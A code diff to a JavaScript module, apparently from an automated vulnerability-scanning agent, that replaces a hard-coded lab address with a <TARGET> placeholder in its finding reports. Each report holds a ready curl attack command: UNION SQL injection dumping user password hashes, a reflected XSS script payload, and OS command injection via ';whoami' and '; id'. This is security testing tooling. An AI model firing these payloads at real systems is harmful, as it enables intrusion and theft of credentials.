@@ -46,7 +46,7 @@ function detectSqli(text) {
       evidence: `Password hash dumped via UNION injection: ${hash}. ` +
                 `The application returned database content (first name, surname, password hashes) ` +
                 `in response to malicious SQL input, confirming injectable query.`,
-      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit" -b "PHPSESSID=<session>; security=low"',
+      command: 'curl -s "<TARGET>/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit" -b "PHPSESSID=<session>; security=low"',
       counterevidence: 'Normal input id=1 returns only single user record without password hashes. ' +
                        'The UNION payload returns multiple rows with hashes, proving injection.',
       confidence: 'high',
@@ -63,7 +63,7 @@ function detectXss(text) {
       class: 'xss',
       title: 'Reflected Cross-Site Scripting (XSS)',
       evidence: `Malicious script payload reflected in server response without encoding.`,
-      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/xss_r/?name=<script>alert(1)</script>" -b "PHPSESSID=<session>; security=low"',
+      command: 'curl -s "<TARGET>/vulnerabilities/xss_r/?name=<script>alert(1)</script>" -b "PHPSESSID=<session>; security=low"',
       counterevidence: 'Normal input is reflected without script execution when properly encoded.',
       confidence: 'high',
     };
@@ -79,7 +79,7 @@ function detectCmdi(text) {
       class: 'cmdi',
       title: 'OS Command Injection',
       evidence: `Operating system command output returned in HTTP response.`,
-      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/exec/" --data "ip=127.0.0.1;whoami&Submit=Submit" -b "PHPSESSID=<session>; security=low"',
+      command: 'curl -s "<TARGET>/vulnerabilities/exec/" --data "ip=127.0.0.1;whoami&Submit=Submit" -b "PHPSESSID=<session>; security=low"',
       counterevidence: 'Normal IP input returns only ping output, no command execution.',
       confidence: 'high',
     };
@@ -104,7 +104,7 @@ function detectSqliVerbal(text) {
       evidence: `Brain verified SQL injection by dumping user table. ` +
                 `Application returned database content in response to UNION payload, ` +
                 `confirming injectable query.`,
-      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit" -b "PHPSESSID=<session>; security=low"',
+      command: 'curl -s "<TARGET>/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit" -b "PHPSESSID=<session>; security=low"',
       counterevidence: 'Normal input returns single record; UNION payload returns multiple rows.',
       confidence: 'high',
     };
@@ -127,7 +127,7 @@ function detectEvidence(text) {
       class: 'sqli',
       title: 'SQL Injection (auto-detected)',
       evidence: `MD5 hash found in output: ${md5Match[0]} - indicates successful data dump`,
-      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users%23&Submit=Submit" -b "PHPSESSID=test; security=low"',
+      command: 'curl -s "<TARGET>/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users%23&Submit=Submit" -b "PHPSESSID=test; security=low"',
       counterevidence: 'Hash pattern could be coincidental; verifier will confirm via UNION query.',
       confidence: 'high',
     };
@@ -139,7 +139,7 @@ function detectEvidence(text) {
       class: 'sqli',
       title: 'SQL Injection (auto-detected)',
       evidence: `SQL syntax error in output indicates injection point`,
-      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/sqli/?id=1%27&Submit=Submit" -b "PHPSESSID=test; security=low"',
+      command: 'curl -s "<TARGET>/vulnerabilities/sqli/?id=1%27&Submit=Submit" -b "PHPSESSID=test; security=low"',
       counterevidence: 'Error could be from invalid input; verifier will confirm.',
       confidence: 'medium',
     };
@@ -151,7 +151,7 @@ function detectEvidence(text) {
       class: 'xss',
       title: 'Cross-Site Scripting (auto-detected)',
       evidence: `XSS payload reflected in output`,
-      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" -b "PHPSESSID=test; security=low"',
+      command: 'curl -s "<TARGET>/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" -b "PHPSESSID=test; security=low"',
       counterevidence: 'Reflection needs verifier confirmation of execution.',
       confidence: 'medium',
     };
@@ -163,7 +163,7 @@ function detectEvidence(text) {
       class: 'cmdi',
       title: 'Command Injection (auto-detected)',
       evidence: `Command output (uid=) found in response`,
-      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/exec/" --data "ip=127.0.0.1%3B+id&Submit=Submit" -b "PHPSESSID=test; security=low"',
+      command: 'curl -s "<TARGET>/vulnerabilities/exec/" --data "ip=127.0.0.1%3B+id&Submit=Submit" -b "PHPSESSID=test; security=low"',
       counterevidence: 'Output could be static; verifier will confirm via command execution.',
       confidence: 'medium',
     };
